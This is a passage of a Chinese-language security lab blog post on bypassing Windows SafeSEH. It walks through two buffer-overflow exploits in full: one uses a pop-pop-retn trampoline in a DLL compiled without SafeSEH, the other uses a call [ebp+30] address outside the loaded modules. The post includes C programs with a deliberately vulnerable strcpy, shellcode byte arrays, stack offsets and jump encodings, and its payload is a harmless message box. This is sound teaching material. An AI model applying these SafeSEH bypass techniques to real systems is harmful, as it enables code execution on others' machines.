class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span></span><br><span class="line"></span><br><span class="line">;</span><br><span class="line"></span><br><span class="line">DWORD <span class="title function_">MyException</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;There is an exception&quot;</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">char</span> * input)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> str[<span class="number">200</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(str,input);	</span><br><span class="line">    <span class="type">int</span> zero=<span class="number">0</span>;</span><br><span class="line">	__try</span><br><span class="line">	&#123;</span><br><span class="line">	    zero=<span class="number">1</span>/zero;</span><br><span class="line">	&#125;</span><br><span class="line">	__except(MyException())</span><br><span class="line">	&#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	HINSTANCE hInst = LoadLibrary(_T(<span class="string">&quot;SEH_NOSafeSEH_JUMP.dll&quot;</span>));<span class="comment">//load No_SafeSEH module</span></span><br><span class="line">	<span class="type">char</span> str[<span class="number">200</span>];</span><br><span class="line">	__asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line">	test(shellcode);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实验思路"><a class="markdownIt-Anchor" href="#实验思路"></a> 实验思路：</h2><p>（ 1）用 VC++ 6 .0 编译一个不使用 SafeSEH 的动态链接库 SEH_NOSafeSEH_JUMP.DLL，然后由启用 SafeSEH 的应用程序 SEH_NOSafeSEH.EXE 去加载它。<br>（ 2）SEH_NOSafeSEH 中的 test 函数通过向 str 复制超长字符串造成 str 溢出，进而覆盖程序的 S.E.H 信息。<br>（ 3）使用 SEH_NOSafeSEH_JUMP.DLL 中的“pop pop retn”指令地址覆盖异常处理函数地址，然后通过制造除 0 异常，让程序转入异常处理。通过劫持异常处理流程，程序转入SEH_NOSaeSEH_JUMP.DLL 中执行“pop pop retn” 指令，在执行 retn 后程序转入 shellcode 执行。</p><table><thead><tr><th></th><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Window XP SP3</td><td>DEP 关闭</td></tr><tr><td>EXE 编译器</td><td>Visual Studio 2008</td><td></td></tr><tr><td>DLL 编译器</td><td>VC++ 6.0</td><td>将 dll 基址设置为 0x11120000</td></tr><tr><td>编译选项</td><td>禁用优化选项</td><td></td></tr><tr><td>build 版本</td><td>release 版本</td><td></td></tr></tbody></table><blockquote><p>说明：将 dll 基址设置为 0x11120000 是为了防止“ pop pop retn”指令地址中存在 0x00。<br>如果以 VC++ 6.0 的默认加载基址 0x10000000 为 DLL 的加载基址，DLL 中的 “pop pop retn” 指令地址可能会包含 0x00，这会导致我们在进行 strcpy 操作时会将字符串截断影响 shellcode 的复制。</p></blockquote><p>注意：记得禁用优化选项，Project --&gt; Properties --&gt; Configuration Properties --&gt; C/C++ --&gt; Optimization --&gt; Optimization 选择 Disabled</p><h2 id="实验步骤"><a class="markdownIt-Anchor" href="#实验步骤"></a> 实验步骤：</h2><p>（ 1）编译一个不启用 SafeSEH 的 DLL</p><ol><li>在VC++ 6.0 中建立一个 Win32 的动态链接库，如下图所示</li></ol><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220606150709169.png" alt="image-20220606150709169"></p><ol start="2"><li>重新设置基址，在顶部菜单中选择 “工程 —&gt; 设置”，然后切换到 ”连接“ 选项卡，在 “工程选项“ 的输入框中添加 ” /base:“0x11120000” “即可，如下图所示</li></ol><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220606151129127.png" alt="image-20220606151129127"></p><ol start="3"><li>编译好后，将 SEH_NOSafeSEH_JUMP.DLL 复制到与 SEH_NOSafeSEH.EXE 相同目录下。</li></ol><p>（ 2）分析要溢出的主程序</p><ol><li>添加 INT 3中断，然后通过 OllySSEH 插件查看加载模块的 SafeSEH 情况。</li></ol><blockquote><p>插件下载地址：(<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-45544.htm">https://bbs.pediy.com/thread-45544.htm</a>)<br>OllySSEH 对于 SafeSEH 的描述：<br>（1） /SafeSEH OFF，未启用 SafeSEH，这种模块可以作为跳板。</p><p>（2） /SafeSEH ON，启用 SafeSEH，可以使用右键点击查看 S.E.H 注册情况。</p><p>（3） No SEH，不支持 SafeSEH，即 IMAGE_DLLCHARACTERISTICS_ NO_SEH 标志位被设置，模块内的异常会被忽略，所以不能作为跳板。</p><p>（4） Error，读取错误</p></blockquote><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220606171712911.png" alt="image-20220606171712911"></p><p>查看结果，如下图所示。主程序 SEH_NOSafeSEH.EXE 中启用了 SafeSEH，但是它里面的模块SEH_NOSafeSEH_JUMP.DLL 未启用 SafeSEH，我们可以利用这个 DLL 中的 ”pop pop retn“ 指令作为跳板来绕过 SafeSEH。</p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220606171616216.png" alt="image-20220606171616216"></p><p>（ 3）确定跳板地址</p><p>转到 0x11120000 中右击，查找 --&gt; 命令序列<br><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220606172452434.png" alt="image-20220606172452434"></p><p>在命令序列框中输入下图命令，查找它</p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220608211412069.png" alt="image-20220608211412069"></p><p>然后我们就找到了在DLL中的 “pop eax pop eax retn”，位于 0x11121068 处，如下图<br><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220608211446531.png" alt="image-20220608211446531"></p><p>（ 4）构造 shellcode</p><ol><li>计算被溢出字符串到最近的异常处理函数指针的距离。<br>先将 shellcode 赋值为 0x90 串，长度小于 200 个字节，然后再 strcpy 操作结束后中断程序。<br>如下图，被溢出字符串起始位置为 0x0012FDB8</li></ol><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220608210733817.png" alt="image-20220608210733817"></p><p>​ 距离它最近的异常处理函数指针位于 0x0012FE90+4 位置。</p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220608212431019.png" alt="image-20220608212431019"></p><p>由于这次使用的是 “pop pop retn” 指令序列，所以我们要将弹出 “failwest” 对话框的机器码放到 shellcode 的后半部分。（避免未命中）</p><blockquote><p>注意：经过 VS 2008 编译的程序，在进入含有__try{}的函数时会在 Security Cookie+4 的位置压入-2（ VC++ 6.0 下为-1），在程序进入__try{}区域时程序会根据该__try{}块在函数中的位置而修改成不同的值。</p><p>例如，函数中有两个__try{}块，在进入第一个__try{}块时这个值会被修改成 0，进入第二个的时候被修改为 1。如果在__try{}块中<strong>出现了异常，程序会根据这个值调用相应的__except()处理</strong>，处理结束后这个位置的值会重新修改为-2；如里没有发生异常，程序在离开__try{}块时这个值也会被修改回-2。当然这个值在异常处理时还有其他用途，在这我们不过多介绍，有兴趣的话可以自己跟踪调试一下。我们只需要知道<strong>由于它的存在，我们的 shellcode 可能会被破坏。</strong></p></blockquote><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220608214503431.png" alt="image-20220608214503431"></p><p>为了避免shellcode 关键部分被破坏，我们采用一下布局：shellcode 最开始部分为 220 个字节的 0x90 填充；在 221~224 位置用跳板地址 0x11121068 覆盖；然后再跟上 8 个字节的 0x90 填充；最后附上弹出 “ failwest” 对话框的机器码。这样就可以保证弹出对话框的机器码不被破坏了。</p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220608220337220.png" alt="image-20220608220337220"></p><blockquote><p>题外话： 在实际的溢出过程中由于条件限制和未知因素， shellcode 有时会被破坏，出现这种情况时可以尝试不同的 shellcode 布局，使用不同的跳转指令，以避开这些破坏。</p></blockquote><p>（ 5）调试运行</p><ol><li>将上面的 shellcode 布置好后，编译运行程序，用 OllyDbg 调试程序，在 0x11121068 处下断点，让程序继续运行。</li></ol><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609143555512.png" alt="image-20220609143555512"></p><ol start="2"><li>我们将会看到，程序停在 0x11121068 处，说明我们已经进入DLL 绕过 SafeSEH，成功劫持程序流程了，如下图。</li></ol><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609144122991.png" alt="image-20220609144122991"></p><ol start="3"><li>继续单步执行，我们将会看到从 0x0012FE90 到 0x0012FEA0 中有一些未知命令，分别是我们用来覆盖异常函数指针的跳板地址和进入__try{}块时被赋值为 0 的部分。本实验中它们对实验结果没有影响，如果有影响，就要用向后跳转指令，跳过影响指令，直接进入关键部分。</li></ol><blockquote><p>可以尝试将 shellcode 中的 217~220 字节用 0xEB0E9090 填充，执行后，他会跳过 shellcode 中间部分，直接运行到弹出对话框部分。</p></blockquote><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609144659336.png" alt="image-20220609144659336"></p><ol start="4"><li>按F9继续执行，就能看到对话框了。</li></ol><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609151230429.png" alt="image-20220609151230429"></p><h1 id="利用加载模块之外的地址绕过-safeseh"><a class="markdownIt-Anchor" href="#利用加载模块之外的地址绕过-safeseh"></a> 利用加载模块之外的地址绕过 SafeSEH</h1><p>在前面我们讲过，SafeSEH 只检查异常处理函数指针是否指向栈中地址，对于指向其它地址它是不对其进行有效性验证的。所以我们可以让异常处理函数指针指向非栈地址，进而就能绕过 SafeSEH 检验。</p><p>然而当程序加载到内存中后，在它所占的整个内存空间中，除了我们平时常见的 PE 文件模块（ EXE 和 DLL）外，还有其他一些映射文件（我们可以通过 OllyDbg 的“view→memory”查看程序的内存映射状态）。例如下图中的 map类型，如果我们能在这些文件中找到跳转指令的话就可以绕过 SafeSEH，而这样的指令也确实存在。</p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609163404514.png" alt="image-20220609163404514"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">跳板指令：</span><br><span class="line">除了前面的 pop eax pop eax retn 外，还有以下指令</span><br><span class="line">call/jmp dword ptr[esp+0x8]</span><br><span class="line">call/jmp dword ptr[esp+0x14]</span><br><span class="line">call/jmp dword ptr[esp+0x1c]</span><br><span class="line">call/jmp dword ptr[esp+0x2c]</span><br><span class="line">call/jmp dword ptr[esp+0x44]</span><br><span class="line">call/jmp dword ptr[esp+0x50]</span><br><span class="line">call/jmp dword ptr[ebp+0xc]</span><br><span class="line">call/jmp dword ptr[ebp+0x24]</span><br><span class="line">call/jmp dword ptr[ebp+0x30]</span><br><span class="line">call/jmp dword ptr[ebp-0x4]</span><br><span class="line">call/jmp dword ptr[ebp-0xc]</span><br><span class="line">call/jmp dword ptr[ebp-0x18]</span><br></pre></td></tr></table></figure><p>只要找到一条指令就能绕过 SafeSEH 了。我们通过下面的程序来演示和分析如何在所有加载模块都开启 SafeSEH 机制的情况下绕过 SafeSEH。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;……&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xE9\x2B\xFF\xFF\xFF\x90\x90\x90&quot;</span><span class="comment">// far jump and \x90</span></span><br><span class="line"><span class="string">&quot;\xEB\xF6\x90\x90&quot;</span><span class="comment">// short jump and \x90</span></span><br><span class="line"><span class="string">&quot;\x0B\x0B\x29\x00&quot;</span><span class="comment">// address of call [ebp+30] in outside memory</span></span><br><span class="line">;</span><br><span class="line">DWORD <span class="title function_">MyException</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;There is an exception&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">char</span> * input)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">200</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(str,input);</span><br><span class="line">    <span class="type">int</span> zero=<span class="number">0</span>;</span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">    	zero=<span class="number">1</span>/zero;</span><br><span class="line">    &#125;</span><br><span class="line">    __except(MyException())</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//__asm int 3</span></span><br><span class="line">    test(shellcode);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实验思路：<br>（ 1） Test 函数中通过向 str 复制超长字符串造成 str 溢出，进而覆盖程序的 S.E.H 信息。<br>（ 2）该程序中所有加载模块都启用了 SafeSEH 机制，故我们不能通过未启用 SafeSEH 的模块还绕过 SafeSEH 了。<br>（ 3）将异常处理函数指针覆盖为加载模块外的地址来实现对 SafeSEH 的绕过，然后通过除 0 触发异常将程序转入异常处理，进而劫持程序流程。</p><table><thead><tr><th></th><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Window XP SP3</td><td>DEP 关闭</td></tr><tr><td>编译器</td><td>Visual Studio 2008</td><td></td></tr><tr><td>编译选项</td><td>禁用优化选项</td><td></td></tr><tr><td>build 版本</td><td>release 版本</td><td></td></tr></tbody></table><blockquote><p>说明： shellcode 中尾部的 0x00290B0B 为 Windows XP SP3 下的跳板地址，如果您在其他操作系统下测试，该地址可能需要重新设置。</p></blockquote><p>实验步骤：</p><p>（ 1）分析程序，先将 shellcode 填充为多个 0x90（长度不超过200个），然后编译运行程序。<br>在 Ollydbg 中用 OllySEH 插件分析加载模块的 SafeSEH 情况，如下图，可以看到，所有加载模块都没有 /SafeSEH OFF 状态。</p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609170143708.png" alt="image-20220609170143708"></p><p>（ 2）在加载模块内存之外<strong>寻找合适的跳板</strong>绕过 SafeSEH。</p><ol><li>接下来需要使用 OllyFindAddr 插件，它能在整个程序的内存空间搜索指令。OllyFindAddr下载地址：<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-198080.htm">https://bbs.pediy.com/thread-198080.htm</a></li><li>使用 call/jmp dword ptr[ebp+n]指令作为跳板。插件 —&gt; OllyFindAddr —&gt; Overflow return address —&gt; Find CALL/JMP [EBP+N]</li></ol><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609170723023.png" alt="image-20220609170723023"></p><ol start="3"><li>在日志中查看搜索结果。Module：Unknown，就是加载模块之外的指令，将 0x00280B0B 作为跳板。</li></ol><blockquote><p>如果不确定，也可以将它与加载模块逐一比对。</p></blockquote><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609171116159.png" alt="image-20220609171116159"></p><p>（ 3）消除异常。如果直接用 0x00280B0B 构造 shellcode，那shellcode 可能会被它中的0x00截断，所以我们要将跳板放在shellcode的最后，防止其造成异常。</p><p>通过前面利用未启用 SafeSEH 模块绕过 SafeSEH，我们知道通过跳板指令转入 shellcode 后首先是4个字节的 0x90 的填充，所以我们可以利用这4个字节来跳转到 shellcode，而前面提到的 0xEB0E9090，其实 0xEB0E 是向前跳转 0x0E 的机器码，可以把它放在这4字节中，但由于1个字节的操作数向前回跳的范围有限，不足以跳转到shellcode 的起始地址，所以我们用两次跳转来完成跳跃。</p><p><strong>部署两个跳板</strong>，在刚刚的 4个字节中部署短跳转指令 0xEBF6 向前回跳 8个字节。（JMP 指令用相对地址跳转时，是以 JMP 下一条指令的地址为基准，所以实际上是向后跳转10个字节）在这 8个字节中再布置一条 5字节的长跳转指令，跳转到 shellcode 的起始部分。</p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609174416604.png" alt="image-20220609174416604"></p><p>（ 4）构造 shellcode</p><ol><li>确定 shellcode 起始地址到长跳转指令之间的距离。</li></ol><p>本实验中，被溢出字符串起始位置为 0x0012FE88，距离最近 SEH地址为 0x0012FF60，部署长跳转指令位于 0x0012FF58，所以我们需要回跳 213 个字节（包含长跳转指令的 5 个字节），使用 E92BFFFFFF（跳转 0xFFFFFF2B 个字节）填充长跳位置。</p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609175749949.png" alt="image-20220609175749949"></p><p>除 0 异常后，最近SEH 地址为0x0012FF60</p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609180802012.png" alt="image-20220609180802012"></p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609182557595.png" alt="image-20220609182557595"></p><ol start="2"><li>部署 shellcode</li></ol><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609183731968.png" alt="image-20220609183731968"></p><p>（ 5）运行验证，对话框弹出</p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609184806753.png" alt="image-20220609184806753"></p></div><div class="article-footer"><blockquote class="mt-2x"><ul class="post-copyright list-unstyled"><li class="post-copyright-link hidden-xs"><strong>本文链接：</strong> <a href="https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/" title="亡羊补牢：SafeSEH" target="_blank" rel="external">https://www.rgzzplus.com/2022/06/09/亡羊补牢：SafeSEH/</a></li><li class="post-copyright-license"><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！</li></ul></blockquote><div class="panel panel-default panel-badger"><div class="panel-body"><figure class="media"><div class="media-left"><a href="https://github.com/rgzz-zq" target="_blank" class="img-burn thumb-sm visible-lg"><img src="/images/avatar.jpg" class="img-rounded w-full" alt=""></a></div><div class="media-body"><h3 class="media-heading"><a href="https://github.com/rgzz-zq" target="_blank"><span class="text-dark">人工智障plus</span><small class="ml-1x"></small></a></h3><div>一只网安菜鸟。</div></div></figure></div></div></div></article><section id="comments"><div id="vcomments"></div></section></div><nav class="bar bar-footer clearfix" data-stick-bottom><div class="bar-inner"><ul class="pager pull-left"><li class="prev"><a href="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/" title="数据与程序的分水岭:DEP"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a></li><li class="next"><a href="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/" title="栈溢出"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a></li><li class="toggle-toc"><a class="toggle-btn" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="文章目录" role="button"><span>[&nbsp;</span><span>文章目录</span> <i class="text-collapsed icon icon-anchor"></i> <i class="text-in icon icon-close"></i> <span>]</span></a></li></ul><div class="bar-right"><div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div></div></div></nav></main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter"><ul class="social-links"><li><a href="https://github.com/rgzz-zq" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li><li><a href="/atom.xml" target="_blank" title="Rss" data-toggle="tooltip" data-placement="top"><i class="icon icon-rss"></i></a></li></ul><div><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_pv">总访问量：<span id="busuanzi_value_site_pv"></span></span> <span class="post-meta-divider"><br></span><span id="busuanzi_container_site_uv">总访客数：<span id="busuanzi_value_site_uv"></span></span></div><div class="copyright">&copy; 2022 rgzzplus<div class="publishby">Theme by <a href="https://github.com/cofess" target="_blank">cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.</div></div></footer><script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script><script>window.jQuery||document.write('<script src="js/jquery.min.js"><\/script>')</script><script src="/js/plugin.min.js"></script><script src="/js/application.js"></script><script>window.INSIGHT_CONFIG={TRANSLATION:{POSTS:"文章",PAGES:"页面",CATEGORIES:"分类",TAGS:"标签",UNTITLED:"(未命名)"},ROOT_URL:"/",CONTENT_URL:"/content.json"}</script><script src="/js/insight.js"></script><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//cdn.jsdelivr.net/npm/valine"></script><script type="text/javascript">var GUEST=["nick","mail","link"],meta=(meta="nick,mail,link").split(",").filter(function(e){return-1<GUEST.indexOf(e)});new Valine({el:"#vcomments",verify:!0,notify:!0,appId:"Ese7lhBjjv43UJw6zLdiIfS0-gzGzoHsz",appKey:"FF6J9UoHgtozwmftxTYfrvqn",placeholder:"说点什么吧！",avatar:"mm",meta:meta,pageSize:"10",visitor:!1})</script><script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.js"></script><script>$(document).ready(function(){$("article img").not("[hidden]").not(".panel-body img").each(function(){var a,t,n=$(this),e=n.attr("alt"),r=n.parent("a");r.length<1&&(-1!=(t=(a=this.getAttribute("src")).lastIndexOf("?"))&&(a=a.substring(0,t)),r=n.wrap('<a href="'+a+'"></a>').parent("a")),r.attr("data-fancybox","images"),e&&r.attr("data-caption",e)}),$().fancybox({selector:'[data-fancybox="images"]',hash:!1,loop:!1})})</script><script defer>var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="//hm.baidu.com/hm.js?94cb135e2b01d42780f4972cb63e3884";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script></body></html>